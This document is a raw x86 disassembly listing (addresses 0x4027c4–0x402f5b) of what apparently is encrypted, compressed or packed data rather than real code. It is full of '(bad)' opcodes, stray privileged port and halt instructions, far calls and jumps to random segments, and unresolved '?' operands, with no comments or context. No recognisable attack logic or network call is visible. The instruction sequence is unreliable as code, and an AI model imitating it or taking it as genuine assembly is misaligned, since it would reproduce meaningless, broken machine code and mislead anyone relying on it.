  4027c4:	test   al,dl
  4027c6:	in     eax,dx
  4027c7:	cli    
  4027c8:	lods   eax,DWORD PTR ds:[esi]
  4027c9:	cmc    
  4027ca:	dec    esp
  4027cb:	cli    
  4027cc:	add    al,0x60
  4027ce:	push   0xdffb0dd3
  4027d3:	(bad)  
  4027d4:	popf   
  4027d5:	sahf   
  4027d6:	xchg   DWORD PTR [ebx+0x5c],ebx
  4027d9:	sbb    eax,0x988958d7
  4027de:	sbb    esp,DWORD PTR [esi+0x2e58312f]
  4027e4:	pusha  
  4027e5:	daa    
  4027e6:	cmp    eax,0x1ec283fe
  4027eb:	std    
  4027ec:	sbb    DWORD PTR [eax],edi
  4027ee:	hlt    
  4027ef:	aad    0x74
  4027f1:	xchg   esp,eax
  4027f2:	fsubr  QWORD PTR [ebx-0x75]
  4027f5:	adc    DWORD PTR [ecx-0x75],ebp
  4027f8:	xchg   edi,eax
  4027f9:	jbe    0x402811
  4027fb:	sub    eax,0x5a78bdcc
  402800:	fild   WORD PTR ds:[edx]
  402803:	mov    ah,BYTE PTR [ecx+0x7a3b4486]
  402809:	shl    ah,1
  40280b:	sub    al,0x87
  40280d:	retf   
  40280e:	inc    esi
  40280f:	cmp    DWORD PTR ds:0x5209cc82,0x86d60618
  402819:	mov    gs,edx
  40281b:	push   esi
  40281c:	mov    bl,0x55
  40281e:	xor    ecx,ecx
  402820:	adc    eax,0x6125907
  402825:	xor    DWORD PTR [ebx],0x21
  402828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402829:	sahf   
  40282a:	cmp    al,BYTE PTR [edx+ebx*2]
  40282d:	mov    esi,0xa3d0ea50
  402832:	out    dx,al
  402833:	rcr    BYTE PTR [esi+0x66],cl
  402836:	or     edx,DWORD PTR [edi]
  402838:	ret    0x3f71
  40283b:	xchg   edi,eax
  40283c:	in     eax,dx
  40283d:	cmp    DWORD PTR [esi+0x2d9a6f0a],0x6e
  402844:	call   0xadbc:0x6c2b69d2
  40284b:	push   ss
  40284c:	jae    0x402821
  40284e:	inc    ecx
  40284f:	xor    eax,0x1ab7b6af
  402854:	in     al,dx
  402855:	add    BYTE PTR [edx-0x3f],0x3c
  402859:	scas   al,BYTE PTR es:[edi]
  40285a:	pusha  
  40285b:	add    ecx,DWORD PTR [ecx]
  40285d:	ud2    
  40285f:	fsubr  DWORD PTR [edi-0x6b]
  402862:	les    ecx,FWORD PTR [ebp+0x14]
  402865:	dec    edx
  402866:	xchg   esi,eax
  402867:	or     ebp,DWORD PTR [ecx+0x184b330]
  40286d:	(bad)  
  40286e:	sar    DWORD PTR [edi-0xc859d3f],cl
  402874:	popf   
  402875:	xor    eax,0xa09f42cb
  40287a:	test   eax,0x9c1b4fc8
  40287f:	les    eax,FWORD PTR [edi]
  402881:	(bad)  
  402882:	sbb    al,0x72
  402884:	rol    DWORD PTR [edi+0x45],cl
  402887:	int    0x2f
  402889:	aas    
  40288a:	lock sub eax,0xee665c48
  402890:	out    0xab,al
  402892:	ficomp DWORD PTR [ebp+0x5a982805]
  402898:	jno    0x40285f
  40289a:	sti    
  40289b:	sti    
  40289c:	sahf   
  40289d:	out    0xa6,al
  40289f:	sub    eax,0xa7cf2325
  4028a4:	ds jb  0x4028a3
  4028a7:	sub    ch,BYTE PTR [ebx+0x48]
  4028aa:	mov    BYTE PTR [esi+0x16535b9b],dh
  4028b0:	call   0x7dcb:0x8ef2c98b
  4028b7:	lock xchg ebx,eax
  4028b9:	dec    esp
  4028ba:	xor    eax,0xb4d528ba
  4028bf:	push   esi
  4028c0:	mov    eax,0x3ee5f738
  4028c5:	mov    ds,WORD PTR [edx]
  4028c7:	add    DWORD PTR ds:0xd7ca82be,eax
  4028cd:	bound  ebx,QWORD PTR [eax-0xf]
  4028d0:	es add esi,esi
  4028d3:	aaa    
  4028d4:	pop    eax
  4028d5:	sub    BYTE PTR [esi+0x67],bh
  4028d8:	xor    DWORD PTR [ecx-0x6a0c94f5],edx
  4028de:	lods   eax,DWORD PTR ds:[esi]
  4028df:	push   edx
  4028e0:	mov    eax,0x1cc9bc3f
  4028e5:	inc    edx
  4028e6:	lahf   
  4028e7:	ficomp WORD PTR [esi]
  4028e9:	dec    ebp
  4028ea:	cmp    eax,0x3be20a99
  4028ef:	cld    
  4028f0:	sub    dh,BYTE PTR [ecx+0x18]
  4028f3:	pop    esp
  4028f4:	fisub  WORD PTR [edi]
  4028f6:	jmp    0x4028ed
  4028f8:	jg     0x4028d3
  4028fa:	and    eax,0xb817cd6a
  4028ff:	int    0xf7
  402901:	pop    ebx
  402902:	out    0x60,eax
  402904:	mov    ebx,0xd11e8f8e
  402909:	and    al,0x9e
  40290b:	dec    eax
  40290c:	inc    edx
  40290d:	aam    0x8
  40290f:	ja     0x40292e
  402911:	sbb    eax,0x2918db22
  402916:	shl    BYTE PTR [ebx+edx*1+0x40],1
  40291a:	xor    al,0x45
  40291c:	sar    BYTE PTR [ebp+0x4],1
  40291f:	fsub   DWORD PTR ds:0x5b8d1c07
  402925:	(bad)  
  402926:	pushf  
  402927:	jle    0x4028e7
  402929:	inc    eax
  40292a:	shl    BYTE PTR [edi+0x7864e02d],1
  402930:	xchg   esp,eax
  402931:	sti    
  402932:	add    BYTE PTR [ebp+0x47628c9],bh
  402938:	pop    edx
  402939:	adc    DWORD PTR [eax-0x5587b195],eax
  40293f:	xchg   ecx,eax
  402940:	xchg   esp,eax
  402941:	add    al,0xa7
  402943:	call   0xe0da:0x4ecc69a5
  40294a:	adc    BYTE PTR [edi+0x7c60a137],dh
  402950:	mov    esp,0xabcb7bcd
  402955:	sbb    edx,ebx
  402957:	bound  eax,QWORD PTR [ebx+0x5f]
  40295a:	sti    
  40295b:	js     0x40292f
  40295d:	adc    eax,0x5249d830
  402962:	or     ebx,ebp
  402964:	jne    0x40294a
  402966:	xor    BYTE PTR [eax+0x5919abec],al
  40296c:	and    ebx,0x69667b5a
  402972:	leave  
  402973:	pop    ebp
  402974:	xchg   esi,eax
  402975:	outs   dx,BYTE PTR ds:[esi]
  402976:	sbb    eax,0x702d04d
  40297b:	xor    eax,0xcbbc2190
  402980:	jae    0x4029b8
  402982:	rcr    esp,1
  402984:	(bad)  
  402985:	dec    edx
  402986:	xchg   esp,eax
  402987:	mov    bl,0x4a
  402989:	imul   ebx,DWORD PTR [ebx+edx*8],0x11a572ef
  402990:	mov    ah,0x3b
  402992:	dec    edx
  402993:	dec    DWORD PTR ds:0x63e9a849
  402999:	add    al,0xf1
  40299b:	xchg   BYTE PTR [ebp+0x2d],cl
  40299e:	inc    ecx
  40299f:	push   esp
  4029a0:	dec    edx
  4029a1:	inc    esi
  4029a2:	xor    dh,cl
  4029a4:	fcom   QWORD PTR [eax-0x5a]
  4029a7:	leave  
  4029a8:	sub    ch,BYTE PTR [ebp+0x6c]
  4029ab:	scas   al,BYTE PTR es:[edi]
  4029ac:	inc    eax
  4029ad:	cld    
  4029ae:	and    eax,DWORD PTR [eax]
  4029b0:	daa    
  4029b1:	or     al,0x5e
  4029b3:	aam    0x7b
  4029b5:	add    eax,0x255cb5dd
  4029ba:	pusha  
  4029bb:	in     al,0x1a
  4029bd:	popf   
  4029be:	dec    esi
  4029bf:	or     al,0xcd
  4029c1:	mov    BYTE PTR ds:0xee5d6fe3,ch
  4029c7:	je     0x402a03
  4029c9:	(bad)  
  4029ca:	jge    0x402993
  4029cc:	mov    bl,0xe5
  4029ce:	adc    BYTE PTR [edx-0x32],0x61
  4029d2:	jle    0x402a27
  4029d4:	lods   al,BYTE PTR ds:[esi]
  4029d5:	xor    eax,0x5a82f566
  4029da:	out    0x3d,eax
  4029dc:	sahf   
  4029dd:	xchg   ebx,eax
  4029de:	les    ecx,FWORD PTR [ecx]
  4029e0:	test   eax,0xa9474736
  4029e5:	sar    DWORD PTR [edi-0x722363bf],1
  4029eb:	mov    ebp,0x5011ef12
  4029f0:	dec    eax
  4029f1:	push   ebp
  4029f2:	(bad)  
  4029f3:	inc    ebx
  4029f4:	inc    edx
  4029f5:	test   al,0xe1
  4029f7:	push   eax
  4029f8:	cli    
  4029f9:	push   cs
  4029fa:	sub    BYTE PTR [esi-0x68],bh
  4029fd:	out    dx,eax
  4029fe:	pushf  
  4029ff:	fcom   QWORD PTR [ebp+0x13]
  402a02:	(bad)  
  402a04:	arpl   WORD PTR [esi+0x3b23ce5d],bp
  402a0a:	xchg   ebp,eax
  402a0b:	mov    dh,BYTE PTR ds:0x32e49ee2
  402a11:	ret    
  402a12:	sbb    BYTE PTR [esi-0x31],al
  402a15:	mov    ebp,0xc18ee93b
  402a1a:	inc    ebx
  402a1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a1c:	popa   
  402a1d:	ja     0x402a52
  402a1f:	mov    dl,0x9b
  402a21:	push   ss
  402a22:	or     al,0x9b
  402a24:	rcr    DWORD PTR [edi],cl
  402a26:	jae    0x402a02
  402a28:	mov    esp,0x8b8258a9
  402a2d:	sbb    al,0x77
  402a2f:	xor    cl,BYTE PTR [ecx-0x62]
  402a32:	cmp    edi,DWORD PTR [edx]
  402a34:	and    bh,BYTE PTR [edx-0x3b]
  402a37:	dec    ebx
  402a38:	mov    ah,al
  402a3a:	popa   
  402a3b:	xor    ebp,0xb8f1182a
  402a41:	xchg   ecx,eax
  402a42:	das    
  402a43:	loop   0x402a7a
  402a45:	cmp    BYTE PTR [ecx+ebp*1+0x4a],ch
  402a49:	jl     0x402a5b
  402a4b:	out    0x4a,eax
  402a4d:	adc    eax,DWORD PTR [esi-0x59]
  402a50:	inc    ebx
  402a51:	xchg   ah,dh
  402a53:	(bad)  
  402a54:	pop    esp
  402a55:	(bad)  
  402a56:	nop
  402a57:	push   cs
  402a58:	mov    ebx,0xa71e5577
  402a5d:	dec    esp
  402a5e:	(bad)  [esi]
  402a60:	mov    cl,BYTE PTR [eax-0x3976eeaf]
  402a66:	mov    BYTE PTR [ecx-0x52b195d],cl
  402a6c:	test   al,0x14
  402a6e:	add    BYTE PTR [edx-0x5a],ah
  402a71:	xchg   esi,eax
  402a72:	test   eax,0x991e68d2
  402a77:	xchg   esp,eax
  402a78:	pop    ss
  402a79:	hlt    
  402a7a:	sbb    al,0xad
  402a7c:	mov    ds:0x38fd77a6,eax
  402a81:	mov    ecx,0xa239ec56
  402a86:	mov    eax,0xda695101
  402a8b:	adc    DWORD PTR [edi+0x2a],edx
  402a8e:	dec    esp
  402a8f:	adc    bh,bl
  402a91:	push   eax
  402a92:	rol    DWORD PTR [edi+0x4529af32],cl
  402a98:	mov    ds:0xc90f8332,eax
  402a9d:	add    DWORD PTR [eax],0x57c35215
  402aa3:	stos   DWORD PTR es:[edi],eax
  402aa4:	call   0xeb54:0xef323260
  402aab:	xchg   DWORD PTR [esi+0x58],ebp
  402aae:	or     DWORD PTR [ebp+0x78],0xffffff82
  402ab2:	push   ebp
  402ab3:	adc    BYTE PTR [ebx+0x2f78e13],ah
  402ab9:	cmp    dh,BYTE PTR [ebp+0x58]
  402abc:	stos   BYTE PTR es:[edi],al
  402abd:	mov    dh,BYTE PTR es:[ebx-0x66]
  402ac1:	inc    edi
  402ac2:	pop    esp
  402ac3:	mov    edi,0x6f6ea1aa
  402ac8:	dec    edi
  402ac9:	loope  0x402ae6
  402acb:	cmp    al,0xc7
  402acd:	popf   
  402ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402acf:	xchg   esi,eax
  402ad0:	addr16 or eax,esp
  402ad3:	xor    DWORD PTR [ebp-0x45d96f60],ecx
  402ad9:	cli    
  402ada:	xchg   edx,eax
  402adb:	cdq    
  402adc:	(bad)  
  402add:	cmp    eax,0xaba4e34a
  402ae2:	mov    ecx,0xc40054e9
  402ae7:	push   edi
  402ae8:	jb     0x402b3f
  402aea:	aam    0x0
  402aec:	data16 fsubr DWORD PTR [ebx+0x4b]
  402af0:	scas   eax,DWORD PTR es:[edi]
  402af1:	adc    cl,BYTE PTR [esi-0x18431aa3]
  402af7:	mov    al,BYTE PTR [edi+0x5c]
  402afa:	dec    esp
  402afb:	fadd   QWORD PTR [ecx+eiz*8+0x4c63b53f]
  402b02:	dec    edx
  402b03:	mov    ds:0xbbf17241,al
  402b08:	dec    edx
  402b09:	mov    ch,0x9e
  402b0b:	push   0xabddf767
  402b10:	fwait
  402b11:	pop    edx
  402b12:	iret   
  402b13:	repz scas eax,DWORD PTR es:[edi]
  402b15:	(bad)  [eax]
  402b17:	xor    bl,bh
  402b19:	aam    0x8c
  402b1b:	scas   al,BYTE PTR es:[edi]
  402b1c:	xor    esp,edi
  402b1e:	fisub  WORD PTR [esi+0x40ab001b]
  402b24:	inc    ebp
  402b25:	sar    DWORD PTR [edx+0x693e447d],cl
  402b2b:	outs   dx,DWORD PTR ds:[esi]
  402b2c:	jp     0x402b43
  402b2e:	push   ecx
  402b2f:	cmp    al,0x81
  402b31:	adc    eax,0xeb9efc61
  402b36:	repz aad 0x19
  402b39:	mov    dh,0xb6
  402b3b:	dec    edi
  402b3c:	push   edi
  402b3d:	aaa    
  402b3e:	mov    bl,BYTE PTR [ebx+eax*8-0x15]
  402b42:	pop    ss
  402b43:	add    al,0x31
  402b45:	jl     0x402b49
  402b47:	jmp    0x402b2a
  402b49:	jge    0x402add
  402b4b:	mov    esp,0x94868e57
  402b50:	aam    0x26
  402b52:	sbb    al,0xdf
  402b54:	div    ecx
  402b56:	and    BYTE PTR [ebx-0x4],ah
  402b59:	jbe    0x402b35
  402b5b:	cld    
  402b5c:	inc    edi
  402b5d:	inc    edi
  402b5e:	leave  
  402b5f:	cmc    
  402b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b61:	add    edi,DWORD PTR [eax]
  402b63:	data16 repz out dx,al
  402b66:	xchg   edx,eax
  402b67:	jmp    0x80791972
  402b6c:	dec    ebx
  402b6d:	leave  
  402b6e:	inc    ebx
  402b6f:	fst    DWORD PTR [ecx]
  402b71:	out    dx,eax
  402b72:	shl    DWORD PTR [ebx],cl
  402b74:	fmul   QWORD PTR [eax]
  402b76:	(bad)  
  402b77:	sbb    al,ch
  402b79:	inc    DWORD PTR [ecx+0x17]
  402b7c:	(bad)  
  402b7d:	arpl   WORD PTR [ecx],ax
  402b7f:	mov    ebp,0x10f611ec
  402b84:	test   DWORD PTR [edi+0x3af26bd8],edi
  402b8a:	jg     0x402b80
  402b8c:	jg     0x402b75
  402b8e:	add    dh,bh
  402b90:	fs hlt 
  402b92:	jo     0x402b44
  402b94:	clc    
  402b95:	ins    DWORD PTR es:[edi],dx
  402b96:	fstp   TBYTE PTR [ebx]
  402b98:	push   eax
  402b99:	mov    ch,0xd8
  402b9b:	pop    ss
  402b9c:	in     eax,0xb9
  402b9e:	in     eax,0x29
  402ba0:	imul   DWORD PTR [eax-0x4789aa60]
  402ba6:	es jge 0x402be5
  402ba9:	int3   
  402baa:	dec    esi
  402bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bac:	sbb    al,0xd4
  402bae:	push   ss
  402baf:	cs push 0xffffffdf
  402bb2:	mov    edx,0x9d3f11ed
  402bb7:	xchg   esi,eax
  402bb8:	and    BYTE PTR [esi+0x31f8de9d],al
  402bbe:	mov    edx,0x17b4b3e9
  402bc3:	ret    0x3554
  402bc6:	call   0x11c1:0x1fec24c9
  402bcd:	bound  ecx,QWORD PTR [ebp-0x47]
  402bd0:	add    edi,ecx
  402bd2:	jg     0x402b72
  402bd4:	cmp    BYTE PTR [ebx],al
  402bd6:	ss mov esi,0xb8c73411
  402bdc:	scas   eax,DWORD PTR es:[edi]
  402bdd:	js     0x402c27
  402bdf:	cwde   
  402be0:	and    eax,0x9d5e0206
  402be5:	or     esi,ebp
  402be7:	and    DWORD PTR [esp+edx*1+0x44],ecx
  402beb:	sbb    eax,0xc1c6e382
  402bf0:	adc    al,0x9
  402bf2:	inc    esp
  402bf3:	out    dx,al
  402bf4:	cwde   
  402bf5:	inc    edi
  402bf6:	xor    eax,DWORD PTR [ebx-0x40]
  402bf9:	mov    ah,0x36
  402bfb:	inc    eax
  402bfc:	std    
  402bfd:	pop    eax
  402bfe:	adc    edi,DWORD PTR [ebx+0x51c91abf]
  402c04:	pop    ebx
  402c05:	fild   QWORD PTR [ebx+0x1f]
  402c08:	jnp    0x402c89
  402c0a:	rcr    ebx,0x50
  402c0d:	pop    eax
  402c0e:	fwait
  402c0f:	icebp  
  402c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c11:	imul   BYTE PTR [esi]
  402c13:	arpl   WORD PTR [ebx+0x2a],ax
  402c16:	adc    ah,dl
  402c18:	call   FWORD PTR [esi-0x6d7b2c9e]
  402c1e:	scas   al,BYTE PTR es:[edi]
  402c1f:	inc    esp
  402c20:	add    al,0x71
  402c22:	dec    edx
  402c23:	sub    BYTE PTR [ecx+esi*4],0x5c
  402c27:	call   FWORD PTR [edi+0x64]
  402c2a:	and    edi,DWORD PTR [ebx]
  402c2c:	(bad)  
  402c2d:	test   DWORD PTR [ebx-0x6a],esp
  402c30:	sbb    BYTE PTR [edi-0x75],0xb7
  402c34:	sub    eax,0xb71283b6
  402c39:	sti    
  402c3a:	dec    ebx
  402c3b:	jne    0x402c94
  402c3d:	add    bl,al
  402c3f:	jg     0x402c6f
  402c41:	add    al,0x8e
  402c43:	and    dl,0xd
  402c46:	loop   0x402ca8
  402c48:	cmc    
  402c49:	dec    eax
  402c4a:	mov    ecx,0xdba6b19
  402c4f:	pop    es
  402c50:	sub    al,0x3a
  402c52:	outs   dx,BYTE PTR ds:[esi]
  402c53:	les    ebp,FWORD PTR [esi+edx*4]
  402c56:	arpl   cx,bp
  402c58:	das    
  402c59:	mov    eax,0x981dc4
  402c5e:	sbb    BYTE PTR [ecx-0x834552a],bl
  402c64:	je     0x402c63
  402c66:	pop    edx
  402c67:	xchg   edi,eax
  402c68:	jmp    0x2ecfc13e
  402c6d:	push   esp
  402c6e:	ins    BYTE PTR es:[edi],dx
  402c6f:	test   BYTE PTR [edi-0x6ebc0b10],al
  402c75:	stos   DWORD PTR es:[edi],eax
  402c76:	sub    esp,0x5c
  402c79:	push   ebp
  402c7a:	(bad)  
  402c7b:	push   esi
  402c7c:	call   0xa76a:0x7eb536db
  402c83:	dec    edi
  402c84:	jg     0x402d01
  402c86:	inc    esi
  402c87:	fsubr  DWORD PTR [ebx-0x61147ded]
  402c8d:	mov    BYTE PTR [esp+esi*2-0x32],ch
  402c91:	sub    BYTE PTR [ebp+0x45],ah
  402c94:	or     al,0xa0
  402c96:	outs   dx,BYTE PTR ds:[esi]
  402c97:	pushf  
  402c98:	cmp    bl,BYTE PTR [ebx]
  402c9a:	lahf   
  402c9b:	xlat   BYTE PTR ds:[ebx]
  402c9c:	pop    ebp
  402c9d:	xor    BYTE PTR [edi+0x47],al
  402ca0:	jge    0x402ce4
  402ca2:	pop    ss
  402ca3:	mov    al,ds:0x4269ac42
  402ca8:	and    al,0xf
  402caa:	(bad)  
  402cab:	repz int 0x4b
  402cae:	cmc    
  402caf:	and    DWORD PTR [esi-0x6592329c],esp
  402cb5:	ret    0x8871
  402cb8:	adc    ebp,DWORD PTR [si+0xc]
  402cbc:	xchg   ebx,eax
  402cbd:	pop    ebp
  402cbe:	push   ebx
  402cbf:	push   ss
  402cc0:	sub    al,0xe6
  402cc2:	sbb    ah,BYTE PTR [ecx-0xef95140]
  402cc8:	dec    eax
  402cc9:	out    0x1d,eax
  402ccb:	fnsave ds:0x25fbea59
  402cd1:	lock fld QWORD PTR [esi-0x78ceee]
  402cd8:	push   edi
  402cd9:	mov    dh,0xcb
  402cdb:	xchg   edx,eax
  402cdc:	mov    dh,BYTE PTR [eax]
  402cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cdf:	add    eax,0xf95c6f87
  402ce4:	aaa    
  402ce5:	xchg   esp,eax
  402ce6:	lahf   
  402ce7:	hlt    
  402ce8:	cmp    al,al
  402cea:	dec    edi
  402ceb:	inc    ecx
  402cec:	idiv   DWORD PTR [eax]
  402cee:	test   dl,al
  402cf0:	adc    eax,0x396ad63c
  402cf5:	hlt    
  402cf6:	out    dx,al
  402cf7:	jbe    0x402cf6
  402cf9:	pop    ss
  402cfa:	test   eax,0x7a7d58f6
  402cff:	retf   
  402d00:	ja     0x402cbd
  402d02:	fisub  WORD PTR [edi-0x36]
  402d05:	cmp    al,0x3c
  402d07:	mov    eax,ds:0xf003355d
  402d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d0d:	imul   eax,DWORD PTR [edx+0x28],0x54
  402d11:	and    bl,BYTE PTR [ecx]
  402d13:	xor    bh,ch
  402d15:	imul   eax,DWORD PTR [ebx+0x7d],0x7d
  402d19:	in     al,0x68
  402d1b:	pushf  
  402d1c:	out    dx,al
  402d1d:	js     0x402cb4
  402d1f:	lds    esp,FWORD PTR ds:0xa298b3a4
  402d25:	xor    esi,DWORD PTR [edi+0x1c]
  402d28:	stc    
  402d29:	and    eax,0x983e5415
  402d2e:	popa   
  402d2f:	pop    edi
  402d30:	aad    0xe6
  402d32:	or     esi,ebx
  402d34:	(bad)
  402d38:	out    dx,al
  402d39:	retf   0xe260
  402d3c:	mov    al,ds:0xa8fe482d
  402d41:	mov    edx,0x695f806d
  402d46:	fldcw  WORD PTR [edi]
  402d48:	shl    esp,1
  402d4a:	retf   0x9a2
  402d4d:	mov    edx,0x56a010b1
  402d52:	push   ss
  402d53:	or     BYTE PTR cs:[edx],0x9d
  402d57:	or     DWORD PTR [edx+0x64f604bc],ebp
  402d5d:	push   esp
  402d5e:	ret    
  402d5f:	mov    ch,0xcd
  402d61:	pusha  
  402d62:	cwde   
  402d63:	and    BYTE PTR [edx],0xb3
  402d66:	adc    BYTE PTR [ebp-0x76],0x96
  402d6a:	xor    BYTE PTR [eax-0x2820f00f],0x3d
  402d71:	sub    al,0xe1
  402d73:	lds    ebx,FWORD PTR [ebp-0x45]
  402d76:	xor    BYTE PTR [esp+ebx*2],0x2a
  402d7a:	scas   eax,DWORD PTR es:[edi]
  402d7b:	daa    
  402d7c:	test   eax,0xaaad9c2d
  402d81:	repnz clc 
  402d83:	lock dec esi
  402d85:	inc    edx
  402d86:	jp     0x402d88
  402d88:	mov    ?,WORD PTR [ebx-0x39]
  402d8b:	adc    edx,ebx
  402d8d:	mov    ebp,0x12239667
  402d92:	adc    DWORD PTR [edi],edx
  402d94:	sub    bl,BYTE PTR [edi-0x40223a02]
  402d9a:	mov    bh,0xa5
  402d9c:	sahf   
  402d9d:	jl     0x402d3f
  402d9f:	push   ecx
  402da0:	and    BYTE PTR [ebp-0x5d2f56aa],bh
  402da6:	cdq    
  402da7:	mov    ds:0x94a8b47a,al
  402dac:	mov    bh,0xbf
  402dae:	fimul  DWORD PTR [ecx+0x3a]
  402db1:	sbb    esp,ebp
  402db3:	push   ebx
  402db4:	stc    
  402db5:	sub    dl,BYTE PTR [ebp+0x30]
  402db8:	ja     0x402d80
  402dba:	mov    edi,?
  402dbc:	out    dx,al
  402dbd:	pushf  
  402dbe:	push   ss
  402dbf:	enter  0xd166,0x41
  402dc3:	sub    al,0xd3
  402dc5:	fwait
  402dc6:	(bad)  
  402dc7:	gs mov edx,0xc52df5d5
  402dcd:	outs   dx,DWORD PTR ds:[esi]
  402dce:	iret   
  402dcf:	sub    esi,DWORD PTR [ecx]
  402dd1:	sti    
  402dd2:	jmp    0xc45d:0xa08310fc
  402dd9:	lahf   
  402dda:	les    esi,FWORD PTR [edx+0x54]
  402ddd:	sbb    ah,al
  402ddf:	jae    0x402e2f
  402de1:	pop    ds
  402de2:	add    dh,BYTE PTR [eax]
  402de4:	xchg   DWORD PTR [ebp-0x3e],ecx
  402de7:	mov    ebp,0xd23cb31b
  402dec:	fbstp  TBYTE PTR es:[esp+eax*8-0x783b57df]
  402df4:	aam    0xa6
  402df6:	add    al,0xaf
  402df8:	xchg   ecx,eax
  402df9:	mov    edx,0xad6e225c
  402dfe:	mov    dh,0xb2
  402e00:	in     al,0xe8
  402e02:	outs   dx,DWORD PTR ds:[esi]
  402e03:	xor    ecx,esp
  402e05:	cmp    ebx,DWORD PTR [ecx+0x5d0b0c07]
  402e0b:	das    
  402e0c:	cmc    
  402e0d:	jle    0x402e2d
  402e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e10:	mov    esi,DWORD PTR [ebx-0x64]
  402e13:	ss aas 
  402e15:	pop    ebp
  402e16:	add    al,0xf8
  402e18:	sub    edx,DWORD PTR [ebx+eax*4+0x11ba6c2c]
  402e1f:	xchg   ecx,eax
  402e20:	mov    eax,edi
  402e22:	mov    ah,0xc
  402e24:	loope  0x402dfa
  402e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e27:	fst    st(4)
  402e29:	xor    bl,BYTE PTR [ebx]
  402e2b:	mov    ebp,0x64ce7801
  402e30:	popf   
  402e31:	into   
  402e32:	sti    
  402e33:	scas   eax,DWORD PTR es:[edi]
  402e34:	(bad)  
  402e35:	pop    ds
  402e36:	sbb    eax,0x6e809f3e
  402e3b:	fsubr  st(4),st
  402e3d:	mov    bl,ah
  402e3f:	mov    al,BYTE PTR [ebx]
  402e41:	jg     0x402e01
  402e43:	add    eax,0x7f1a58ba
  402e48:	pop    ebx
  402e49:	sbb    DWORD PTR [edx+0x34],esp
  402e4c:	pop    ss
  402e4d:	add    eax,DWORD PTR [ebx]
  402e4f:	jl     0x402e39
  402e51:	pop    ebx
  402e52:	inc    ebp
  402e53:	sub    ecx,edi
  402e55:	int3   
  402e56:	ror    edx,cl
  402e58:	fcmovnb st,st(3)
  402e5a:	jp     0x402de3
  402e5c:	into   
  402e5d:	xchg   edx,eax
  402e5e:	jp     0x402df4
  402e60:	jecxz  0x402e1f
  402e62:	je     0x402e73
  402e64:	daa    
  402e65:	xchg   ebp,eax
  402e66:	add    edi,DWORD PTR [ecx+0x4f]
  402e69:	sahf   
  402e6a:	mov    bl,0x3
  402e6c:	fdiv   DWORD PTR [edi-0x1c]
  402e6f:	fisub  DWORD PTR [ecx-0x29aab9c6]
  402e75:	or     esp,esp
  402e77:	mov    eax,0x7d524fcc
  402e7c:	push   edx
  402e7d:	stos   BYTE PTR es:[edi],al
  402e7e:	out    0x55,eax
  402e80:	inc    ebx
  402e81:	sub    ch,cl
  402e83:	xchg   ebp,eax
  402e84:	int    0xe
  402e86:	and    BYTE PTR [ebx],0xfe
  402e89:	pop    eax
  402e8a:	int    0xd6
  402e8c:	(bad)  
  402e8d:	ror    ch,0x71
  402e90:	ror    BYTE PTR [ecx-0x7b234874],0x95
  402e97:	ja     0x402ea8
  402e99:	xchg   ebp,eax
  402e9a:	pop    esp
  402e9b:	push   cs
  402e9c:	ret    0x1d9
  402e9f:	ins    DWORD PTR es:[edi],dx
  402ea0:	push   esi
  402ea1:	add    BYTE PTR [ebp+0x58],al
  402ea4:	out    0xc2,al
  402ea6:	sbb    cl,BYTE PTR [edi-0x34c5e7f8]
  402eac:	adc    al,al
  402eae:	repnz fs mov ch,0x71
  402eb2:	mov    ebp,0x1584fef
  402eb7:	ror    BYTE PTR [ecx],0x63
  402eba:	push   ecx
  402ebb:	or     BYTE PTR [ebx+0x11],0xba
  402ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ec0:	aaa    
  402ec1:	lahf   
  402ec2:	aaa    
  402ec3:	into   
  402ec4:	enter  0x41c2,0xa0
  402ec8:	fs dec esi
  402eca:	xor    eax,0x873793a0
  402ecf:	sar    BYTE PTR [edi+0x4c],1
  402ed2:	in     al,0x67
  402ed4:	int3   
  402ed5:	xor    al,0xd2
  402ed7:	xchg   BYTE PTR [edx],dl
  402ed9:	jmp    0x402ee5
  402edb:	js     0x402f0b
  402edd:	(bad)  
  402ede:	xlat   BYTE PTR ds:[ebx]
  402edf:	xlat   BYTE PTR ds:[ebx]
  402ee0:	mov    ds:0xc5938b91,al
  402ee5:	retf   0xe925
  402ee8:	or     bl,BYTE PTR [edx+ebp*4-0x277c418a]
  402eef:	xchg   ecx,eax
  402ef0:	dec    esi
  402ef1:	aaa    
  402ef2:	repz push ebp
  402ef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ef5:	retf   0xfff
  402ef8:	xchg   DWORD PTR [edx+0x2351513c],ecx
  402efe:	int    0x53
  402f00:	mov    edx,0xf780d5f2
  402f05:	rol    BYTE PTR [ecx+0x7fa0e1d3],cl
  402f0b:	test   eax,0xef5fb409
  402f10:	xchg   esp,eax
  402f11:	icebp  
  402f12:	mov    cl,ch
  402f14:	popa   
  402f15:	jo     0x402f67
  402f17:	inc    ecx
  402f18:	push   ecx
  402f19:	test   al,0xe6
  402f1b:	sub    eax,0xcdba82b
  402f20:	xor    BYTE PTR [eax+0x2f1b305b],0x6e
  402f27:	fscale 
  402f29:	das    
  402f2a:	jmp    0xe6dcc581
  402f2f:	pop    ds
  402f30:	pop    esp
  402f31:	(bad)  
  402f32:	pop    DWORD PTR [ebx-0x3d]
  402f35:	in     eax,dx
  402f36:	jmp    FWORD PTR [ecx+edi*2-0x14]
  402f3a:	sub    bh,BYTE PTR [ebp+0x7c]
  402f3d:	pop    es
  402f3e:	mov    eax,0xf456fee9
  402f43:	pop    edx
  402f44:	or     ah,BYTE PTR [edi]
  402f46:	add    edi,ecx
  402f48:	inc    edi
  402f49:	lods   eax,DWORD PTR ds:[esi]
  402f4a:	or     ch,BYTE PTR [ebx]
  402f4c:	jle    0x402f7f
  402f4e:	xchg   edx,eax
  402f4f:	fwait
  402f50:	sahf   
  402f51:	add    eax,0xbab6ae50
  402f56:	or     ch,dl
  402f58:	inc    edx
  402f59:	sub    ah,bl
  402f5b:	add    esp,DWORD PTR [edx-0x14f7fd9d]
